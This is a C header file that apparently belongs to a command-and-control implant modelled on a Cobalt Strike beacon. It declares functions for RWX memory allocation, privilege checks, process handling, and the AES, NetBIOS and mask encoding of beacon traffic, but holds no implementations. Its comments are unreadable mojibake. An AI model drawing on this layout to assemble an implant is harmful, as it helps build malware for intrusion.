#pragma once
#include "MetaData.h"
#include <Psapi.h>
#include <dbghelp.h>
#pragma warning(disable:4996) 

typedef struct {
    char* original; /* ԭʼ������ [�������ǿ����ͷ���] */
    char* buffer;   /* ָ��ǰ������λ�� */
    int    length;   /* ʣ�����ݳ��� */
    int    size;     /* �˻��������ܴ�С */
} formatp;

typedef struct {
    char* original; /* ԭʼ������ [�������ǿ����ͷ���] */
    char* buffer;   /* ָ��ǰ������λ�� */
    int    length;   /* ʣ�����ݳ��� */
    int    size;     /* �˻��������ܴ�С */
} datap;
char getRandomLetter();
LPVOID RWXaddress();
void DataProcess(unsigned char* buf, size_t lenn, int callback);
int Duan(DWORD currentProcessId);
bool IsHighPriv();
void PutUint32BigEndian(uint8_t* bytes, uint32_t value);
void PutUint16BigEndian(uint8_t* bytes, uint16_t value);
unsigned char* RandomAESKey(unsigned char* aesKey, size_t keyLength);
int GenerateEvenRandomInt(int min, int max);
uint8_t* ConByte(uint8_t** arrays, size_t* sizes, size_t numArrays);
uint8_t* WriteInt(size_t nInt, uint8_t* bBytes);
char* base64Encode(unsigned char* data, size_t inputLength);
unsigned char* NetbiosDecode(unsigned char* data, int data_length, unsigned char key, size_t* NetbiosDecodelen);
unsigned char* NetbiosEncode(unsigned char* data, size_t data_length, unsigned char key, size_t* encoded_length);
unsigned char* MaskDecode(unsigned char* data, size_t data_length, unsigned char* key, int key_length);
unsigned char* MaskEncode(unsigned char* data, size_t data_length, size_t* codelen);
unsigned char* AesCBCDecrypt(unsigned char* encryptData, unsigned char* key, size_t dataLen, size_t* decryptAES_CBCdatalen);
unsigned char* AesCBCEncrypt(unsigned char* data, unsigned char* key, size_t dataLen, size_t* encryptedDataLen);
uint32_t bigEndianUint32(uint8_t b[4]);
unsigned char* CodepageToUTF8(unsigned char* input, size_t inputLen, size_t* outputLen);
unsigned char* HMkey( unsigned char* encryptedBytes, size_t encryptedBytesLen);
unsigned char* intToUnsignedChar(int value);
unsigned char* str_replace_all(unsigned char* str, unsigned char* find, unsigned char* replace);
uint16_t Readshort(uint8_t* b);
